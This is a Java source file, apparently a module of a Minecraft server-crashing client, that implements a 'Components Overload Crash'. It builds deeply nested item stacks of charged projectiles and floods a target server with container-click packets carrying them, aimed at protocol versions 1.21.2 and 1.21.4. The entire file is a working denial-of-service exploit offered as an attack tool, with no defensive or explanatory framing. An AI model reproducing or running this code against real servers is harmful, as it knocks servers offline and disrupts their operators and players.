package us.whitedev.crashers.impl;

import de.florianmichael.vialoadingbase.ViaLoadingBase;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import us.whitedev.crashers.Crasher;
import us.whitedev.gui.clickgui.ClickGui;
import us.whitedev.protocol.components.data.DataComponents;
import us.whitedev.protocol.components.data.impl.DataChargedProjectiles;
import us.whitedev.protocol.components.objects.ItemStack;
import us.whitedev.protocol.packets.PacketCodec;
import us.whitedev.protocol.packets.play.PacketContainerClick;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

import java.util.ArrayList;
import java.util.List;

public class Cipher1 implements Crasher {
    private static final String METHOD_NAME = "Cipher1";
    private boolean enabled = false;

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int chargedProjectilesCount1 = Integer.parseInt(args[3]);
        int chargedProjectilesCount2 = Integer.parseInt(args[4]);
        setEnabled(true);

        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.isVisible ? getName() : "******"), true);

        int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();
        if (protocol >= 768 && protocol < 770) {
            ItemStack stack1;
            {
                List<ItemStack> chargedProjectiles = new ArrayList<>(chargedProjectilesCount1);
                ItemStack chargedProjectile = new ItemStack(1, 1, null);

                for (int i = 0; i < chargedProjectilesCount1; ++i) chargedProjectiles.add(chargedProjectile);

                DataComponents components = new DataComponents();
                components.put(new DataChargedProjectiles(chargedProjectiles));

                stack1 = new ItemStack(1233, 1, components);
            }

            ItemStack stack2;
            {
                List<ItemStack> chargedProjectiles = new ArrayList<>(chargedProjectilesCount2);

                for (int i = 0; i < chargedProjectilesCount2; ++i) chargedProjectiles.add(stack1);

                DataComponents components = new DataComponents();
                components.put(new DataChargedProjectiles(chargedProjectiles));

                stack2 = new ItemStack(1233, 1, components);
            }


            PacketCodec.sendPacket(new PacketContainerClick(protocol ,0, 1, 10,
                    PacketContainerClick.ContainerActionType.CLICK_ITEM, PacketContainerClick.ContainerAction.RIGHT_CLICK,
                    stack2, new Int2ObjectArrayMap<>()), packets);
        } else {
            msgHelper.sendMessage("To use " + getName() + " you must be using &cVersion 1.21.2/1.21.4&7, and your current protocol is &c" + protocol, true);
        }

        setEnabled(false);
        msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
    }


    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public String getArgsUsage() {
        return "packets[100], size[2048], count[11]";
    }

    @Override
    public List<OptionUtil> getOptions() {
        return List.of(
                new OptionUtil("Packets", OptionType.INTEGER),
                new OptionUtil("Size", OptionType.INTEGER),
                new OptionUtil("Count", OptionType.INTEGER)
        );
    }

    @Override
    public String getDescription() {
        return "1.20.5+ Components Overload Crash";
    }
}
